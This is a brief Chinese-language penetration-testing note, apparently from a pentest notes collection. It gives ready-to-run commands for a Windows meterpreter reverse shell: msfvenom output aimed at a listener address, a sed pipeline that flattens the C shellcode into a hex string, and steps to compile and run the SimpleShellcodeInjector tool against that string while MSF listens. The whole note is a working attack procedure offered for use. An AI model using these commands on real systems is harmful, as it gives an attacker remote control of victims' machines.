	https://github.com/DimopoulosElias/SimpleShellcodeInjector
	生成payload(c)
	>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.108 lport=12138 -f c -o shellcode.c
	执行
	>cat shellcode.c |grep -v unsigned|sed "s/\"\\\x//g"|sed "s/\\\x//g"|sed "s/\"//g"|sed ':a;N;$!ba;s/\n//g'|sed "s/;//g"
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/56.png)

	MSF监听
	可使用minGW自行编译
	>gcc SimpleShellcodeInjector.c -o xxx.exe
	执行
	>xxx.exe +生成的编码